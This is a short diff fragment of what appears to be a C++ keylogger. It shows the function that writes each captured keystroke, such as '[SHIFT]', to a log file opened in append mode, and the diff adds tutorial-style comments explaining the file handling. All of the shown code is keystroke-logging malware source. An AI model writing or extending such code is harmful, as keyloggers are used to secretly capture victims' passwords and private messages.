@@ -24,8 +24,8 @@ return 0;
 int Save(int _key, char *file) {
     cout<< _key << endl;
     Sleep(10);
-    FILE *OUTPUT_FILE;
-    OUTPUT_FILE = fopen(file, "a+");
+    FILE *OUTPUT_FILE; // can also use the ofstream command
+    OUTPUT_FILE = fopen(file, "a+"); //a+ is used to add new keys each time, and not overwrite
     switch(_key)
     {
         case VK_SHIFT: fprintf(OUTPUT_FILE, "[SHIFT]");
